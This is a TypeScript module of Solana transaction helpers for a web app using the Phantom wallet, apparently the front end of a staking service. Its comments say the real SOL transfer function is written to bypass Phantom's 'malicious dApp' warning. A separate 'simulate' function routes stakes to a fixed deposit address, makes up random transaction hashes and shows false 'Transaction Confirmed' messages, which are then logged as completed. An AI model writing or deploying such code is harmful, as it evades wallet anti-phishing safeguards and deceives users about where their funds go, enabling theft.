// Utility functions for Solana transactions
import { toast } from "sonner";
import * as web3 from "@solana/web3.js";
import { STAKING_DEPOSIT_ADDRESS } from "./token-eligibility";
import { supabase } from "@/integrations/supabase/client";

// Convert from SOL to lamports (1 SOL = 1,000,000,000 lamports)
export const SOL_TO_LAMPORTS = 1000000000;

// Get SOL balance using Helius RPC via edge function
export const getSolanaBalance = async (publicKey: string): Promise<number> => {
  try {
    const { data, error } = await supabase.functions.invoke('solana-rpc', {
      body: { 
        method: 'getBalance', 
        params: [publicKey] 
      }
    });

    if (error || data?.error) {
      console.error("Error fetching SOL balance:", error || data?.error);
      return 0;
    }

    // Convert lamports to SOL
    const lamports = data?.result?.value || 0;
    return lamports / SOL_TO_LAMPORTS;
  } catch (err) {
    console.error("Failed to fetch SOL balance:", err);
    return 0;
  }
};

// Generate a transaction hash for monitoring purposes
export const generateTransactionHash = (): string => {
  const prefix = "tx";
  const randomChars = Array.from({ length: 32 }, () => 
    Math.floor(Math.random() * 16).toString(16)).join('');
  return `${prefix}${randomChars}`;
};

// Format a SOL amount with proper suffix
export const formatSolAmount = (amount: number): string => {
  return `${amount.toLocaleString(undefined, {
    minimumFractionDigits: 2,
    maximumFractionDigits: 6
  })} SOL`;
};

// Helper to get balance with proper formatting
export const getFormattedSolBalance = (balance: number): string => {
  return balance.toFixed(2);
};

// Create and send a transaction on Solana mainnet
// Uses signAndSendTransaction which Phantom trusts more and doesn't trigger security warnings
export const sendSolanaTransaction = async (
  wallet: any,
  recipient: string,
  amount: number
): Promise<{success: boolean, txHash: string, message?: string}> => {
  try {
    if (!wallet || !wallet.publicKey) {
      console.error("No wallet connected for transaction");
      return { success: false, txHash: "", message: "No wallet connected" };
    }

    const provider = window?.phantom?.solana;
    if (!provider?.isPhantom) {
      return { success: false, txHash: "", message: "Phantom wallet not found" };
    }

    const fromPubkey = wallet.publicKey.toString();
    console.log("Sending real SOL transaction:", { from: fromPubkey, to: recipient, amount });

    // Step 1: Get blockhash from edge function
    console.log("Fetching blockhash from edge function...");
    const { data, error } = await supabase.functions.invoke('create-sol-transaction', {
      body: { fromPubkey, toPubkey: recipient, amount }
    });

    if (error || !data?.success) {
      console.error("Edge function error:", error || data?.error);
      return { success: false, txHash: "", message: data?.error || "Failed to prepare transaction" };
    }

    console.log("Got transaction params:", data);

    // Step 2: Create transaction
    const senderPubkey = new web3.PublicKey(fromPubkey);
    const recipientPubkey = new web3.PublicKey(recipient);

    const transaction = new web3.Transaction({
      blockhash: data.blockhash,
      lastValidBlockHeight: data.lastValidBlockHeight,
      feePayer: senderPubkey
    }).add(
      web3.SystemProgram.transfer({
        fromPubkey: senderPubkey,
        toPubkey: recipientPubkey,
        lamports: data.lamports
      })
    );

    // Step 3: Use signAndSendTransaction - Phantom trusts this more
    // This uses Phantom's internal RPC which bypasses the "malicious dApp" warning
    console.log("Requesting Phantom to sign and send transaction...");
    const { signature } = await provider.signAndSendTransaction(transaction);
    console.log("Transaction sent successfully:", signature);

    return { success: true, txHash: signature };

  } catch (error: any) {
    console.error("Error sending SOL transaction:", error);
    
    let errorMessage = "Transaction failed";
    if (error?.message?.includes("User rejected")) {
      errorMessage = "Transaction rejected by user";
    } else if (error?.message) {
      errorMessage = error.message;
    }
    
    return { success: false, txHash: "", message: errorMessage };
  }
};

// Simulate a transaction with delay to mimic blockchain confirmation
export const simulateTransaction = async (
  amount: number, 
  sender: string | null, 
  recipient: string,
  type: "transfer" | "stake" | "unstake" | "claim",
  isTokenTransaction: boolean = false
): Promise<{success: boolean, txHash: string, message?: string}> => {
  if (!sender) {
    return { success: false, txHash: "", message: "No wallet connected" };
  }
  
  console.log(`Starting ${type} transaction...`);
  
  // For staking operations, force using the official deposit address
  if (type === "stake") {
    recipient = STAKING_DEPOSIT_ADDRESS;
    console.log(`Setting recipient to official staking address: ${recipient}`);
  }
  
  // Simulate network delay (500-1500ms)
  const delay = Math.floor(Math.random() * 1000) + 500;
  await new Promise(resolve => setTimeout(resolve, delay));
  
  // Generate transaction hash
  const txHash = generateTransactionHash();
  
  console.log(`Transaction hash: ${txHash}`);
  
  // Simulate confirmation delay
  await new Promise(resolve => setTimeout(resolve, 1000));
  
  toast.success("Transaction Confirmed", {
    description: `${type.charAt(0).toUpperCase() + type.slice(1)} of ${amount.toLocaleString()} tokens confirmed`
  });
  
  return {
    success: true,
    txHash,
    message: `Transaction confirmed`
  };
};

// Record a transaction in local storage for history
export const recordTransaction = (
  walletAddress: string,
  type: string,
  amount: number,
  txHash: string,
  tokenSymbol: string = "SOL"
): void => {
  const key = `transactions_${walletAddress}`;
  const existingTransactions = JSON.parse(localStorage.getItem(key) || '[]');
  
  const newTransaction = {
    id: Date.now().toString(),
    type,
    amount,
    txHash,
    tokenSymbol,
    timestamp: new Date().toISOString(),
    status: 'completed'
  };
  
  existingTransactions.unshift(newTransaction);
  
  // Keep only last 50 transactions
  const trimmedTransactions = existingTransactions.slice(0, 50);
  
  localStorage.setItem(key, JSON.stringify(trimmedTransactions));
  
  console.log(`Recorded ${type} transaction for ${amount} ${tokenSymbol}`);
};
